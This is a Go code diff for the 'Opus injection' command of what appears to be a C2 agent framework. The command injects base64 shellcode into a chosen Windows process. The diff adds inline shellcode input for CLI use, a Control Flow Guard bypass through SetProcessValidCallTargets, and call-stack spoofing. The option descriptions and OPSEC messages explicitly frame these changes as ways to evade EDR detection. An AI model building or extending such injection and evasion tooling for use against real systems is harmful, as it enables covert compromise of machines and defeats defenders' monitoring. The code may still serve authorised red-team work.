@@ -24,6 +24,7 @@ func init() {
 		AssociatedBrowserScript: &agentstructs.BrowserScript{ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "opusinjection_new.js"), Author: "@galoryber"},
 		CommandAttributes: agentstructs.CommandAttribute{
 			SupportedOS: []string{agentstructs.SUPPORTED_OS_WINDOWS},
+			FilterCommandAvailabilityByAgentBuildParameters: map[string]string{"selected_os": "Windows"},
 		},
 		CommandParameters: []agentstructs.CommandParameter{
 			{
@@ -45,6 +46,11 @@ func init() {
 					{
 						ParameterIsRequired: true,
 						GroupName:           "New File",
+						UIModalPosition:     1,
+					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
 						UIModalPosition:     1,
 					},
 				},
@@ -80,8 +86,24 @@ func init() {
 				},
 			},
 			{
+				Name:             "shellcode_b64",
+				ModalDisplayName: "Shellcode (Base64)",
+				CLIName:          "shellcode_b64",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				Description:      "Base64-encoded shellcode (for CLI/API usage)",
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     0,
+					},
+				},
+			},
+			{
 				Name:                 "pid",
 				ModalDisplayName:     "Target PID",
+				CLIName:              "pid",
 				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
 				Description:          "The process ID to inject into (console process for Variant 1, GUI process for Variant 4)",
 				DynamicQueryFunction: getProcessList,
@@ -97,17 +119,65 @@ func init() {
 						GroupName:           "New File",
 						UIModalPosition:     2,
 					},
+					{
+						ParameterIsRequired: true,
+						GroupName:           "CLI",
+						UIModalPosition:     2,
+					},
+				},
+			},
+			{
+				Name:             "cfg_bypass",
+				ModalDisplayName: "CFG Bypass",
+				CLIName:          "cfg_bypass",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Mark shellcode allocation as a valid CFG call target (required on Windows 10/11 with Control Flow Guard enabled). Disable only if SetProcessValidCallTargets triggers EDR detection.",
+				DefaultValue:     true,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{
+						ParameterIsRequired: false,
+						GroupName:           "Default",
+						UIModalPosition:     3,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "New File",
+						UIModalPosition:     3,
+					},
+					{
+						ParameterIsRequired: false,
+						GroupName:           "CLI",
+						UIModalPosition:     3,
+					},
+				},
+			},
+			{
+				Name:             "stack_spoof",
+				ModalDisplayName: "Stack Spoof",
+				CLIName:          "stack_spoof",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				Description:      "Spoof the call stack during injection API calls. Requires indirect_syscalls and stack_spoof build options.",
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default", UIModalPosition: 4},
+					{ParameterIsRequired: false, GroupName: "New File", UIModalPosition: 4},
+					{ParameterIsRequired: false, GroupName: "CLI", UIModalPosition: 4},
 				},
 			},
 		},
 		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
 			pid, _ := taskData.Args.GetStringArg("pid")
 			variant, _ := taskData.Args.GetStringArg("variant")
+			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
+			cfgNote := ""
+			if cfgBypass {
+				cfgNote = " CFG bypass enabled (SetProcessValidCallTargets — detectable by some EDRs)."
+			}
 			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
 				TaskID:             taskData.Task.ID,
 				Success:            true,
 				OpsecPreBlocked:    false,
-				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %s. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.", variant, pid),
+				OpsecPreMessage:    fmt.Sprintf("OPSEC WARNING: Opus injection (variant: %s) into PID %s. Callback-based injection using unexplored Windows mechanisms — novel technique with minimal EDR signatures.%s", variant, pid, cfgNote),
 				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
 			}
 		},
@@ -158,12 +228,22 @@ func init() {
 				return response
 			}
 
-			// Resolve file contents by checking actual args (not ParameterGroupName)
-			filename, fileContents, fErr := resolveFileContents(taskData)
-			if fErr != nil {
-				response.Success = false
-				response.Error = fErr.Error()
-				return response
+			// Check for direct base64 shellcode first (CLI/API usage)
+			var shellcodeB64 string
+			var filename string
+			sc, _ := taskData.Args.GetStringArg("shellcode_b64")
+			if sc != "" {
+				shellcodeB64 = sc
+				filename = "(inline)"
+			} else {
+				fname, fileContents, fErr := resolveFileContents(taskData)
+				if fErr != nil {
+					response.Success = false
+					response.Error = fErr.Error()
+					return response
+				}
+				filename = fname
+				shellcodeB64 = base64.StdEncoding.EncodeToString(fileContents)
 			}
 
 			// Get the target PID
@@ -181,6 +261,12 @@ func init() {
 				return response
 			}
 
+			// Decode to get size for display
+			scBytes, decErr := base64.StdEncoding.DecodeString(shellcodeB64)
+			if decErr != nil {
+				logging.LogError(decErr, "Failed to decode shellcode for size check")
+			}
+
 			// Build variant description
 			variantDesc := "Unknown"
 			targetNote := ""
@@ -195,15 +281,19 @@ func init() {
 
 			// Build the display parameters
 			displayParams := fmt.Sprintf("Variant: %d (%s)\nShellcode: %s (%d bytes)\nTarget PID: %d\nNote: %s",
-				variant, variantDesc, filename, len(fileContents), pid, targetNote)
+				variant, variantDesc, filename, len(scBytes), pid, targetNote)
 			response.DisplayParams = &displayParams
-			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Opus variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(fileContents)))
+			createArtifact(taskData.Task.ID, "Process Inject", fmt.Sprintf("Opus variant %d (%s) into PID %d (%d bytes)", variant, variantDesc, pid, len(scBytes)))
 
 			// Build the actual parameters JSON that will be sent to the agent
+			cfgBypass, _ := taskData.Args.GetBooleanArg("cfg_bypass")
+			stackSpoof, _ := taskData.Args.GetBooleanArg("stack_spoof")
 			params := map[string]interface{}{
-				"shellcode_b64": base64.StdEncoding.EncodeToString(fileContents),
+				"shellcode_b64": shellcodeB64,
 				"pid":           pid,
 				"variant":       variant,
+				"cfg_bypass":    cfgBypass,
+				"stack_spoof":   stackSpoof,
 			}
 
 			paramsJSON, err := json.Marshal(params)
